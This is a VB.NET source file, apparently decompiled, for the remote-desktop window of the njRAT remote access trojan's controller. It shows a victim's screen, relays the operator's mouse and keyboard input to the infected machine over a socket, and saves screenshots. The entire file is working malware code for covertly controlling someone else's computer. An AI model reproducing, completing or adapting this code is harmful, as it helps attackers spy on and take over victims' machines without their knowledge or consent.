Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports NJRAT.NJRAT

Public Class sc
    Inherits Form

    Public co As Integer
    Public dbf As Long
    Public Folder As String
    Public fps As Integer
    Private int_0 As Integer
    Public IsActive As Boolean
    Public Oimg As Bitmap
    Public osk As Client
    Public pkt As Long
    Private point_0 As Point
    Private point_1 As Point
    Private point_2 As Point
    Public QQ As String
    Public sk As Client
    Public sz As Size
    Public Sub New()
        Me.QQ = String.Empty
        Me.Oimg = Nothing
        Me.point_0 = New Point
        Me.point_1 = New Point
        Me.co = 0
        Me.Folder = String.Empty
        Me.point_2 = New Point(30, 30)
        Me.IsActive = False
        Me.fps = 0
        Me.int_0 = 0
        Me.dbf = 0
        Me.InitializeComponent()
    End Sub
    Public Sub KDW(ByVal sender As Object, ByVal e As KeyEventArgs)
        If (Me.Button1.Text = "Start") Then
            Return
        End If
        Me.p.Focus()
        If Me.CheckBox2.Checked Then
            Select Case e.KeyCode
                Case Keys.Shift, Keys.ShiftKey, Keys.LShiftKey, Keys.RShiftKey
                    Me.sk.Send(String.Concat(New String() {"#", Class7.string_1, Conversions.ToString(0), Class7.string_1, Conversions.ToString(&H10)}))
                    GoTo Label_00E8
            End Select
            Me.sk.Send(String.Concat(New String() {"#", Class7.string_1, Conversions.ToString(0), Class7.string_1, Conversions.ToString(CInt(e.KeyCode))}))
        End If
Label_00E8:
        e.SuppressKeyPress = True
    End Sub

    Public Sub KUP(ByVal sender As Object, ByVal e As KeyEventArgs)
        If (Me.Button1.Text = "Start") Then
            Return
        End If
        Me.p.Focus()
        If Me.CheckBox2.Checked Then
            Select Case e.KeyCode
                Case Keys.Shift, Keys.ShiftKey, Keys.LShiftKey, Keys.RShiftKey
                    Me.sk.Send(String.Concat(New String() {"#", Class7.string_1, Conversions.ToString(2), Class7.string_1, Conversions.ToString(&H10)}))
                    GoTo Label_00E8
            End Select
            Me.sk.Send(String.Concat(New String() {"#", Class7.string_1, Conversions.ToString(2), Class7.string_1, Conversions.ToString(CInt(e.KeyCode))}))
        End If
Label_00E8:
        e.SuppressKeyPress = True
    End Sub

    Private Sub p_MouseDown(sender As Object, e As MouseEventArgs) Handles p.MouseDown
        Dim box As PictureBox = Me.p
        SyncLock box
            If (Me.CheckBox1.Checked AndAlso (Me.Button1.Text <> "Start")) Then
                Dim num As Integer
                Dim point As New Point(CInt(Math.Round(CDbl((e.X * (CDbl(Me.sz.Width) / CDbl(Me.p.Width)))))), CInt(Math.Round(CDbl((e.Y * (CDbl(Me.sz.Height) / CDbl(Me.p.Height)))))))
                If (e.Button = MouseButtons.Left) Then
                    num = 2
                End If
                If (e.Button = MouseButtons.Right) Then
                    num = 8
                End If
                Me.sk.Send(String.Concat(New String() {"@", Class7.string_1, Conversions.ToString(point.X), Class7.string_1, Conversions.ToString(point.Y), Class7.string_1, Conversions.ToString(num)}))
            End If
        End SyncLock
    End Sub

    Private Sub p_MouseEnter(sender As Object, e As EventArgs) Handles p.MouseEnter
        Me.IsActive = True
    End Sub

    Private Sub p_MouseLeave(sender As Object, e As EventArgs) Handles p.MouseLeave
        Me.IsActive = False
    End Sub

    Private Sub p_MouseMove(sender As Object, e As MouseEventArgs) Handles p.MouseMove
        Me.point_2 = e.Location
        If (Me.point_2.Y < 20) Then
            Me.Button2.Visible = True
        Else
            Me.Button2.Visible = False
        End If
        Dim box As PictureBox = Me.p
        SyncLock box
            If ((Not Me.p.Focused And Me.CheckBox2.Checked) Or Me.CheckBox1.Checked) Then
                Me.p.Focus()
            End If
        End SyncLock
    End Sub

    Private Sub p_MouseUp(sender As Object, e As MouseEventArgs) Handles p.MouseUp
        If (Me.CheckBox1.Checked AndAlso (Me.Button1.Text <> "Start")) Then
            Dim num As Integer
            Dim point As New Point(CInt(Math.Round(CDbl((e.X * (CDbl(Me.sz.Width) / CDbl(Me.p.Width)))))), CInt(Math.Round(CDbl((e.Y * (CDbl(Me.sz.Height) / CDbl(Me.p.Height)))))))
            If (e.Button = MouseButtons.Left) Then
                num = 4
            End If
            If (e.Button = MouseButtons.Right) Then
                num = &H10
            End If
            Me.sk.Send(String.Concat(New String() {"@", Class7.string_1, Conversions.ToString(point.X), Class7.string_1, Conversions.ToString(point.Y), Class7.string_1, Conversions.ToString(num)}))
        End If
    End Sub

    Private Sub p_MouseWheel(sender As Object, e As MouseEventArgs) Handles p.MouseWheel
        Dim box As PictureBox = Me.p
        SyncLock box
            If (Me.CheckBox1.Checked AndAlso (Me.Button1.Text <> "Start")) Then
                Me.sk.Send(String.Concat(New String() {"@", Class7.string_1, Conversions.ToString(e.Delta), Class7.string_1, Conversions.ToString(Me.point_1.Y), Class7.string_1, Conversions.ToString(&H800)}))
            End If
        End SyncLock
    End Sub

    Private Sub p_Paint(sender As Object, e As PaintEventArgs) Handles p.Paint
        Dim text As String = (Conversions.ToString(Me.int_0) & "fps" & ChrW(13) & ChrW(10) & Class6.smethod_17(Me.pkt))
        Dim size As Size = TextRenderer.MeasureText([text], New Font(Me.Font, FontStyle.Bold))
        If Not ((Me.point_2.X < size.Width) And (Me.point_2.Y < size.Height)) Then
            Dim rect As New Rectangle(0, 0, size.Width, size.Height)
            e.Graphics.FillRectangle(New Pen(Color.FromArgb(100, 1, 1, 1)).Brush, rect)
            Dim red As Brush = Brushes.Red
            If (Me.int_0 > 3) Then
                red = Brushes.YellowGreen
            End If
            If (Me.int_0 > 6) Then
                red = Brushes.LimeGreen
            End If
            e.Graphics.DrawString([text], New Font(Me.Font, FontStyle.Bold), red, CSng(0.0!), CSng(0.0!))
        End If
    End Sub

    Private Sub p_Resize(sender As Object, e As EventArgs) Handles p.Resize
        Me.Button2.Left = CInt(Math.Round(CDbl(((CDbl(Me.p.Width) / 2) - (CDbl(Me.Button2.Width) / 2)))))
        Me.Button2.Top = (Me.p.Top + 3)
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If (Me.Button1.Text = "Stop") Then
            Me.Button1.Text = "Start"
            Me.sk.Send("!!")
            Me.ComboBox1.Enabled = True
        Else
            Me.ComboBox1.Enabled = False
            Me.Button1.Text = "Stop"
            Dim num As Single = CSng((Conversions.ToDouble(Me.ComboBox1.Text.Remove(0, 1)) / 100))
            Dim size As New Size((CInt(Math.Round(CDbl(((Me.sz.Width * num) / 10.0!)))) * 10), (CInt(Math.Round(CDbl(((Me.sz.Height * num) / 10.0!)))) * 10))
            Me.sk.Send(String.Concat(New String() {"!", Class7.string_1, Me.sk.ip, Class7.string_1, Conversions.ToString(size.Width), "x", Conversions.ToString(size.Height), Class7.string_1, "0"}))
        End If
    End Sub

    Private Sub vmethod_16_Tick(sender As Object, e As EventArgs) Handles vmethod_16.Tick
        Me.vmethod_12.Enabled = False
        If (Not Me.osk.CN Or Not Me.sk.CN) Then
            Me.sk.CN = False
            Me.Panel1.Enabled = False
            Me.Text = ("Disconnected!! " & Me.QQ)
            Me.Close()
        Else
            Me.int_0 = Me.fps
            Me.fps = 0
            If (Me.int_0 = 0) Then
                Me.pkt = 0
                Me.p.Invalidate()
            End If
            Me.vmethod_12.Enabled = True
        End If
    End Sub

    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        
    End Sub

    Private Sub vmethod_12_Tick(sender As Object, e As EventArgs) Handles vmethod_12.Tick
        Me.ProgressBar1.Value = Me.sk.rp
        Dim point As Point = Me.PointToClient(Cursor.Position)
        If (((point.X > -1) And (point.Y > -1)) And Me.IsActive) Then
            Me.point_0 = New Point(CInt(Math.Round(CDbl((point.X * (CDbl(Me.sz.Width) / CDbl(Me.p.Width)))))), CInt(Math.Round(CDbl((point.Y * (CDbl(Me.sz.Height) / CDbl(Me.p.Height)))))))
            If ((Me.CheckBox1.Checked And (Me.Button1.Text <> "Start")) AndAlso (Me.point_0 <> Me.point_1)) Then
                Me.point_1 = Me.point_0
                Me.sk.SEND_(Class6.smethod_11(String.Concat(New String() {"@", Class7.string_1, Conversions.ToString(Me.point_1.X), Class7.string_1, Conversions.ToString(Me.point_1.Y), Class7.string_1, Conversions.ToString(1)})))
            End If
        End If
    End Sub

    Private Sub sc_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        If (Not Me.sk Is Nothing) Then
            Me.sk.CN = False
        End If
    End Sub

    Private Sub sc_Load(sender As Object, e As EventArgs) Handles Me.Load
        Try
            Dim box As PictureBox = Me.p
            SyncLock box
                Me.QQ = Conversions.ToString(Class7.smethod_1(Me.osk.L))
                Me.Text = Me.QQ
                Dim control As Control = Me.p
                AddHandler control.KeyUp, New KeyEventHandler(AddressOf Me.KUP)
                AddHandler control.KeyDown, New KeyEventHandler(AddressOf Me.KDW)
                Me.ComboBox1.SelectedIndex = Conversions.ToInteger(Class7.class8_0.string_0)
            End SyncLock
            Me.Folder = (Me.osk.Folder & "Screen\")
            If Not Directory.Exists(Me.Folder) Then
                Directory.CreateDirectory(Me.Folder)
            End If
            If Class7.class8_0.bool_6 Then
                Me.Button1_Click(RuntimeHelpers.GetObjectValue(sender), e)
            End If
            If (Me.Button1.Text <> "Start") Then
                Me.Button2_Click(RuntimeHelpers.GetObjectValue(sender), e)
            End If
        Catch exception1 As Exception
            Me.Close()
        End Try
    End Sub

    Private Sub sc_ResizeBegin(sender As Object, e As EventArgs) Handles Me.ResizeBegin
        Dim box As PictureBox = Me.p
        SyncLock box
        End SyncLock
    End Sub

    Private Sub sc_ResizeEnd(sender As Object, e As EventArgs) Handles Me.ResizeEnd
        Dim box As PictureBox = Me.p
        SyncLock box
        End SyncLock
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If Not Me.Panel1.Visible Then
            Me.Panel1.Visible = True
            Me.Button2.BackgroundImage = My.Resources.bullet_arrow_up
        Else
            Me.Panel1.Visible = False
            Me.Button2.BackgroundImage = My.Resources.bullet_arrow_down
        End If
    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
        If Me.CheckBox3.Checked Then
            Try
                Process.Start(Me.Folder)
            Catch exception1 As Exception
            End Try
        End If
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged

    End Sub
End Class